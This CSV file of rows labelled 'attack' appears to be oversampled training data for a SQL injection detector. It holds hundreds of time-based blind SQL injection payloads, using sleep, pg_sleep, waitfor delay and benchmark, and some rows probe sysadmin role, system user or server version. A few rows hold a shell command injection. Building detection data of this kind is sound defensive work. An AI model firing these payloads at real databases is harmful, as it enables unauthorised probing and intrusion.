id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_000988,attack,time,"""   )    )    or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000028,1.3206819758541914
SMOTE_000989,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,0.47618161005955695
SMOTE_000990,attack,time," )  ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000027,2.290439278516727
SMOTE_000991,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000024,2.2094118724132255
SMOTE_000992,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,0.0630457478575196
SMOTE_000993,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,1.4728702765867006
SMOTE_000994,attack,time,1 waitfor delay '0:0:10'--,nearest_attack_euclidean,R000021,0.24362642981503693
SMOTE_000995,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,1.1202233962312957
SMOTE_000996,attack,time, )   or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000018,0.03439220711200903
SMOTE_000997,attack,time,""" or sleep  (  __TIME__  )  #",nearest_attack_euclidean,R000030,2.329303588320565
SMOTE_000998,attack,time," )  ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000027,0.39143042611800954
SMOTE_000999,attack,time,"""   )    )    or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000026,2.285427659894884
SMOTE_001000,attack,time,""";waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000025,1.080815468460358
SMOTE_001001,attack,time,"1 or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000013,3.6382508587604008
SMOTE_001002,attack,time,a' waitfor delay '0:0:10'--,nearest_attack_euclidean,R000011,0.5705694222248381
SMOTE_001003,attack,time, )    )    or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000031,2.303180847962894
SMOTE_001004,attack,time,""";waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000025,1.8193554169303015
SMOTE_001005,attack,time,a' waitfor delay '0:0:10'--,nearest_attack_euclidean,R000011,2.266389031084779
SMOTE_001006,attack,time,""" or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000001,0.06054323997478447
SMOTE_001007,attack,time,"""   )    )    or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000028,2.6025972452093034
SMOTE_001008,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,1.110577671812078
SMOTE_001009,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,0.9947485012249456
SMOTE_001010,attack,time,""" or sleep  (  __TIME__  )  #",nearest_attack_euclidean,R000030,1.4678626134410138
SMOTE_001011,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,0.34966733363372576
SMOTE_001012,attack,time," )  ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000027,1.6752325627483085
SMOTE_001013,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,0.41924926176519234
SMOTE_001014,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,1.4158469568124525
SMOTE_001015,attack,time,"""  )  ;waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000009,1.8213231710659135
SMOTE_001016,attack,time,"""   )    )    or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000026,0.40643979150552845
SMOTE_001017,attack,time, )   or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000018,0.09647287925985237
SMOTE_001018,attack,time,"""   )    )    or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000026,0.7044444849983028
SMOTE_001019,attack,time,a' waitfor delay '0:0:10'--,nearest_attack_euclidean,R000011,1.3727809291139474
SMOTE_001020,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,1.394728977885019
SMOTE_001021,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,1.833543906821033
SMOTE_001022,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,0.048380365402000136
SMOTE_001023,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000024,1.7068564988806034
SMOTE_001024,attack,time,a' waitfor delay '0:0:10'--,nearest_attack_euclidean,R000011,0.925147064756894
SMOTE_001025,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,0.6699096466520894
SMOTE_001026,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000023,0.8210554346260486
SMOTE_001027,attack,time,"""  )   or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000012,1.2836525267866656
SMOTE_001028,attack,time,"""  )   or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000012,0.8935074802669124
SMOTE_001029,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,0.03634709076928634
SMOTE_001030,attack,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000007,2.56624838621343
SMOTE_001031,attack,time, )   or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000018,0.2533027175816873
SMOTE_001032,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,0.13859845594726186
SMOTE_001033,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,0.09048320306467122
SMOTE_001034,attack,time,"""  )  ;waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000009,1.7834612286628846
SMOTE_001035,attack,time,or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000022,0.160586765677167
SMOTE_001036,attack,time,""" or sleep  (  __TIME__  )  #",nearest_attack_euclidean,R000030,0.7000166099423977
SMOTE_001037,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,0.6550316227246018
SMOTE_001038,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,0.29688026460535794
SMOTE_001039,attack,time,$  (  sleep 50  ) ,nearest_attack_euclidean,R000004,0.8572833289319686
SMOTE_001040,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,2.2237900363451
SMOTE_001041,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,0.7229195152180943
SMOTE_001042,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,1.2204835358150008
SMOTE_001043,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,1.6971702264600284
SMOTE_001044,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,1.348733289949629
SMOTE_001045,attack,time,"""  )  ;waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000009,0.30648902857214955
SMOTE_001046,attack,time,$  (  sleep 50  ) ,nearest_attack_euclidean,R000004,1.552541813176387
SMOTE_001047,attack,time,or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000022,0.6727429987865126
SMOTE_001048,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,0.6528541960590805
SMOTE_001049,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,2.083483630792782
SMOTE_001050,attack,time,"1 or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000013,1.5676906842355334
SMOTE_001051,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,0.48590639385530116
SMOTE_001052,attack,time,""";waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000025,2.042187764200974
SMOTE_001053,attack,time,or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000022,0.22981891052332373
SMOTE_001054,attack,time,"""   )    )    or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000026,1.6036943240199064
SMOTE_001055,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000024,2.1545206239302854
SMOTE_001056,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,2.072362394463867
SMOTE_001057,attack,time,"""   )    )    or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000026,1.767139817511898
SMOTE_001058,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,2.3300183294979284
SMOTE_001059,attack,time,""" or sleep  (  __TIME__  )  #",nearest_attack_euclidean,R000030,0.7127791298220307
SMOTE_001060,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,0.6861590432595615
SMOTE_001061,attack,time,""" or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000001,0.43001108523128545
SMOTE_001062,attack,time,"""   )    )    or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000028,1.081611169222043
SMOTE_001063,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,0.976327744255529
SMOTE_001064,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,0.00689727500390882
SMOTE_001065,attack,time,"""   )    )    or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000028,0.3633286538327666
SMOTE_001066,attack,time,"""  )  ;waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000009,1.5591709302175043
SMOTE_001067,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,1.2480828465677476
SMOTE_001068,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,0.766456834133964
SMOTE_001069,attack,time, )   or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000018,0.10404591035578425
SMOTE_001070,attack,time," )  ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000027,0.8985541744705035
SMOTE_001071,attack,time," )  ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000027,2.054047551463842
SMOTE_001072,attack,time,",waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000016,0.9302253576534391
SMOTE_001073,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000023,1.8449537901114674
SMOTE_001074,attack,time,"""   )    )    or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000028,1.633181081137025
SMOTE_001075,attack,time,pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000015,1.9079111983787453
SMOTE_001076,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,1.047542975091054
SMOTE_001077,attack,time, )   or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000018,0.20736343849733674
SMOTE_001078,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,0.06552357022023728
SMOTE_001079,attack,time,a' waitfor delay '0:0:10'--,nearest_attack_euclidean,R000011,2.349856396645865
SMOTE_001080,attack,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000007,0.8013782592019073
SMOTE_001081,attack,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000007,1.9953918355647668
SMOTE_001082,attack,time,1 waitfor delay '0:0:10'--,nearest_attack_euclidean,R000021,0.0268438523018294
SMOTE_001083,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,0.7787595654802629
SMOTE_001084,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000023,0.8967371481637952
SMOTE_001085,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,0.9942734762398721
SMOTE_001086,attack,time,or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000022,0.7359811584099204
SMOTE_001087,attack,time," )  ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000027,1.5860699500763682
SMOTE_001088,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,0.6267439090655272
SMOTE_001089,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,1.9472574614266727
SMOTE_001090,attack,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000007,0.0035175192067892435
SMOTE_001091,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,0.9504974287368294
SMOTE_001092,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000023,0.542752462677005
SMOTE_001093,attack,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000007,0.001648459538998911
SMOTE_001094,attack,time,or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000019,1.7222439346615521
SMOTE_001095,attack,time,"""   )    )    or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000026,0.3013630300105576
SMOTE_001096,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,1.587435112645284
SMOTE_001097,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,0.9693456702843295
SMOTE_001098,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,1.4310005903548613
SMOTE_001099,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000024,2.503233468264872
SMOTE_001100,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,0.6307029152433886
SMOTE_001101,attack,time,"""  )   or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000012,2.0891240030813956
SMOTE_001102,attack,time,or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000019,0.27039201937971424
SMOTE_001103,attack,time,""";waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000025,0.8867383813072802
SMOTE_001104,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,0.5553778400663241
SMOTE_001105,attack,time,a' waitfor delay '0:0:10'--,nearest_attack_euclidean,R000011,2.3641719730494377
SMOTE_001106,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,0.08194927166436416
SMOTE_001107,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,0.5103323230190766
SMOTE_001108,attack,time,"""   )    )    or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000028,2.190298858876036
SMOTE_001109,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,1.495948418129508
SMOTE_001110,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,0.3349005076718817
SMOTE_001111,attack,time,"; if not  (  substring   (    (   select @@version  )  ,24,1  )   <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000005,0.005444527065185961
SMOTE_001112,attack,time,",waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000016,0.002448313801598285
SMOTE_001113,attack,time,",waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000016,0.7876023915223499
SMOTE_001114,attack,time," )  ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000027,1.6207486096688095
SMOTE_001115,attack,time,$  (  sleep 50  ) ,nearest_attack_euclidean,R000004,2.0546259808656653
SMOTE_001116,attack,time,""" or sleep  (  __TIME__  )  #",nearest_attack_euclidean,R000030,0.2844332920180639
SMOTE_001117,attack,time,""";waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000025,1.8880936155040187
SMOTE_001118,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,0.4932574108389758
SMOTE_001119,attack,time,$  (  sleep 50  ) ,nearest_attack_euclidean,R000004,0.26639716180738376
SMOTE_001120,attack,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000007,0.5978504145763093
SMOTE_001121,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,0.0786772991379141
SMOTE_001122,attack,time,"""   )    )    or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000028,1.9820232284542931
SMOTE_001123,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,0.15584772320921633
SMOTE_001124,attack,time,""" or sleep  (  __TIME__  )  #",nearest_attack_euclidean,R000030,2.558325074838228
SMOTE_001125,attack,time,",waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000016,0.8500903355173188
SMOTE_001126,attack,time," )  ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000027,1.4735376138311975
SMOTE_001127,attack,time,"; if not  (  substring   (    (   select @@version  )  ,24,1  )   <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000005,0.000889060851488893
SMOTE_001128,attack,time," )  ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000027,0.8866388969507449
SMOTE_001129,attack,time, )    )    or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000031,0.19220825606139014
SMOTE_001130,attack,time,""" or sleep  (  __TIME__  )  #",nearest_attack_euclidean,R000030,1.1804141886126867
SMOTE_001131,attack,time,""" or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000001,0.03254788783039765
SMOTE_001132,attack,time, )    )    or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000031,0.2265107351847413
SMOTE_001133,attack,time, )    )    or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000031,1.9471540170644601
SMOTE_001134,attack,time,"""  )   or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000012,1.1474135136446415
SMOTE_001135,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000024,0.04308382082559982
SMOTE_001136,attack,time, )    )    or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000031,0.5802690401439499
SMOTE_001137,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,1.2809240523599899
SMOTE_001138,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,0.45137168951677076
SMOTE_001139,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,1.2249777150661827
SMOTE_001140,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,0.9998636129622397
SMOTE_001141,attack,time,a' waitfor delay '0:0:10'--,nearest_attack_euclidean,R000011,0.33777778688998544
SMOTE_001142,attack,time, )   or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000018,0.23411308581045628
SMOTE_001143,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,1.2253236192582768
SMOTE_001144,attack,time,or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000022,0.5659900652498459
SMOTE_001145,attack,time," )  ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000027,1.30789608858868
SMOTE_001146,attack,time, )   or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000018,1.3745021255838707
SMOTE_001147,attack,time,or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000019,0.0388001012417561
SMOTE_001148,attack,time," )  ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000027,1.4997883392672657
SMOTE_001149,attack,time,"""  )  ;waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000009,0.36240780517547794
SMOTE_001150,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,1.1640462608043116
SMOTE_001151,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,0.2940115019729064
SMOTE_001152,attack,time,"""  )  ;waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000009,1.5174630951613275
SMOTE_001153,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000023,2.096218162927167
SMOTE_001154,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,0.42012985692536137
SMOTE_001155,attack,time,$  (  sleep 50  ) ,nearest_attack_euclidean,R000004,1.2118552905575315
SMOTE_001156,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,0.6121519653687164
SMOTE_001157,attack,time,"; if not  (  substring   (    (   select @@version  )  ,24,1  )   <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000005,0.0
SMOTE_001158,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,1.6745947025469075
SMOTE_001159,attack,time, )    )    or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000031,0.20131517636301952
SMOTE_001160,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,1.0398746510300776
SMOTE_001161,attack,time,""" or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000001,0.33038421108370136
SMOTE_001162,attack,time,""";waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000025,1.4172139692788333
SMOTE_001163,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,1.092812594130874
SMOTE_001164,attack,time,"; if not  (  substring   (    (   select @@version  )  ,24,1  )   <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000005,0.0
SMOTE_001165,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,0.6638113128173596
SMOTE_001166,attack,time," )  ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000027,1.4278178028579356
SMOTE_001167,attack,time,"""   )    )    or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000026,0.6016250919223964
SMOTE_001168,attack,time, )   or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000018,2.1479336926350876
SMOTE_001169,attack,time,""" or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000001,1.2723384276269953
SMOTE_001170,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,0.5481746273238083
SMOTE_001171,attack,time, )   or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000018,1.7502893479560702
SMOTE_001172,attack,time,"""   )    )    or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000026,0.28196271806168577
SMOTE_001173,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,0.8460110537751893
SMOTE_001174,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,2.2636020964288117
SMOTE_001175,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,0.37300438442213985
SMOTE_001176,attack,time,"; if not  (  substring   (    (   select @@version  )  ,24,1  )   <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000005,0.0
SMOTE_001177,attack,time,"""   )    )    or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000028,0.9917507254601736
SMOTE_001178,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000024,1.1395755815117403
SMOTE_001179,attack,time,"1 or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000013,4.225839354338607
SMOTE_001180,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,1.1869483207636118
SMOTE_001181,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,0.5659039777938575
SMOTE_001182,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,0.25641029881218985
SMOTE_001183,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,2.142845037649476
SMOTE_001184,attack,time,or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000019,0.8722254313026365
SMOTE_001185,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,1.040597401994845
SMOTE_001186,attack,time,""";waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000025,0.6020004752396863
SMOTE_001187,attack,time,",waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000016,1.1378263472633723
SMOTE_001188,attack,time,"""   )    )    or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000028,0.31579503539927484
SMOTE_001189,attack,time,"""   )    )    or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000028,0.5048500509285426
SMOTE_001190,attack,time,"""   )    )    or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000028,0.4160016854698026
SMOTE_001191,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000024,0.15078722071047057
SMOTE_001192,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,1.8757806940684
SMOTE_001193,attack,time,"""  )  ;waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000009,0.8801533435526404
SMOTE_001194,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,0.24727276310720978
SMOTE_001195,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,0.3175410644848153
SMOTE_001196,attack,time,a' waitfor delay '0:0:10'--,nearest_attack_euclidean,R000011,0.6127148881709346
SMOTE_001197,attack,time,1 waitfor delay '0:0:10'--,nearest_attack_euclidean,R000021,0.01145923196167589
SMOTE_001198,attack,time,"; if not  (  substring   (    (   select @@version  )  ,24,1  )   <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000005,0.4241143757100305
SMOTE_001199,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000024,2.736104876450521
